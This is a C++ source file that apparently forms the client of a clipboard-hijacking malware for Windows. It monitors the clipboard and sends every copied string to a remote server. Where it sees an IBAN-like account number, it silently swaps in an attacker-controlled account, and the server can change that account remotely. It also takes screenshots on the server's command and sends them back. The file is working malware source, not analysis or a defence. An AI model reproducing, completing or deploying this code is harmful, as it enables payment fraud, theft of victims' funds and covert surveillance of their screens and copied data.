#include "ClientWindow.hh"
#include <iostream>
#include <regex>
#include "tools.hh"
#include <fstream>

ClientWindow::ClientWindow() :
	socket(SocketType::CONNECT_SOCKET, ClientConfig::PORT, ClientConfig::IP_ADDRESS)
{
	this->SetTargetAccountNumber(ClientConfig::TARGET_ACCOUNT_NUMBER);
}

LRESULT ClientWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_DESTROY:
		if (!::RemoveClipboardFormatListener(this->hwnd)) {
			throw ClipboardListenerException("RemoveClipboardFormatListener failed: " + Winapi::GetErrorMessage());
		}
		::PostQuitMessage(0);
		return 0;
	case WM_CREATE:
		if (!::AddClipboardFormatListener(this->hwnd)) {
			throw ClipboardListenerException("AddClipbordFormatListener failed: " + Winapi::GetErrorMessage());
		}
		return 0;
	case WM_CLIPBOARDUPDATE:
		this->OnClipboardChange();
		return 0;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		auto hdc = ::BeginPaint(hwnd, &ps);
		::FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
		::EndPaint(this->hwnd, &ps);
	}

	return 0;
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
	}
}

std::string ClientWindow::ReadClipboardText() {
	if (!::IsClipboardFormatAvailable(CF_TEXT)) { return ""; }
	::OpenClipboard(this->hwnd);
	auto hCbMem = ::GetClipboardData(CF_TEXT);
	if (hCbMem == NULL) {
		::CloseClipboard();
		return "";
	}
	auto memSize = ::GlobalSize(hCbMem);
	auto hProgMem = ::GlobalAlloc(GHND, memSize);
	if (hProgMem == NULL) {
		::CloseClipboard();
		return "";
	}
	auto lpCbMem = ::GlobalLock(hCbMem);
	auto lpProgMem = ::GlobalLock(hProgMem);
	strcpy_s((char*)lpProgMem, memSize, (char*)lpCbMem);
	::GlobalUnlock(hCbMem);
	::GlobalUnlock(hProgMem);
	::CloseClipboard();
	return std::string((char*)lpProgMem);
}

void ClientWindow::WriteClipboardText(std::string str) {
	auto pStr = str.c_str();
	auto wLen = str.size() + 1;
	auto hGlMem = ::GlobalAlloc(GHND, wLen);
	auto lpGlMem = ::GlobalLock(hGlMem);
	::strcpy_s((char*)lpGlMem, wLen, pStr);
	::GlobalUnlock(hGlMem);
	::OpenClipboard(this->hwnd);
	::EmptyClipboard();
	::SetClipboardData(CF_TEXT, hGlMem);
	::CloseClipboard();
}

bool ClientWindow::IsAccountNumber(const std::string& str) {
	return std::regex_match(str, std::regex{ "[a-zA-Z]{2}[0-9]{2}[a-zA-Z0-9]{4}[0-9]{7}([a-zA-Z0-9]?){0,16}" });
}

bool ClientWindow::SwapAccountNumber() {
	auto currentClipboardText = this->ReadClipboardText();
	if (currentClipboardText == "") { return false; }
	if (!this->IsAccountNumber(currentClipboardText)) { return false; }
	this->WriteClipboardText(this->targetAccountNumber);
	return true;
}

void ClientWindow::SendClipboardStringToServer(const std::string& str) {
	auto size = strlen(str.c_str());
	this->socket.SendMetadata(Metadata{ DataType::CLIPBOARD_STRING, size });
	this->socket.SendBytes(str.c_str(), size);
}

void ClientWindow::SendAccountSwapNotificationToServer() {
	this->socket.SendMetadata(Metadata{ DataType::ACCOUNT_SWAP_NOTIFICATION, 0 });
}

void ClientWindow::OnClipboardChange() {
	Tools::PrintDebugMessage("OnCLipboardChange called");
	auto clipboardString = this->ReadClipboardText();
	if (clipboardString.empty()) { return; }
	this->SendClipboardStringToServer(clipboardString);
	if (this->SwapAccountNumber()) {
		this->SendAccountSwapNotificationToServer();
	}
}

void ClientWindow::MakeAndSendScreenshot() {
	Tools::PrintDebugMessage("Making SCREENSHOT");
	auto result = Winapi::GetScreenshotAsJpegBytes(L"test.jpg"s);
	Tools::PrintDebugMessage("SS size: " + std::to_string(result.size()));
	this->socket.SendMetadata(Metadata{ DataType::SCREENSHOT, result.size() });
	auto bytesSent = this->socket.SendBytes(result.data(), result.size());
	Tools::PrintDebugMessage("Sent bytes: " + std::to_string(bytesSent));
	{
		auto file = std::ofstream("testing.jpg", std::ios_base::binary);
		std::copy(result.begin(), result.end(), std::ostreambuf_iterator<char>(file));
	}

}

void ClientWindow::BlockingListen() {
	while (true) {
		auto metadata = this->socket.RecvMetadata();
		switch (metadata.dataType) {
		case DataType::CHANGE_ACCOUNT_NUMBER_CMD:
			this->SetTargetAccountNumber(socket.RecvString(metadata));
			break;
		case DataType::MAKE_SCREENSHOT_CMD:
			this->MakeAndSendScreenshot();
			break;
		default:;
		}
	}
}

std::string ClientWindow::GetTargetAccountNumber() const {
	std::lock_guard<std::mutex> lock(this->targetAccountNumberMutex);
	return targetAccountNumber;
}

void ClientWindow::SetTargetAccountNumber(const std::string& targetAccountNumber) {
	std::lock_guard<std::mutex> lock(this->targetAccountNumberMutex);
	this->targetAccountNumber = targetAccountNumber;
	Tools::PrintDebugMessage("Updated account number to:" + this->targetAccountNumber);

}
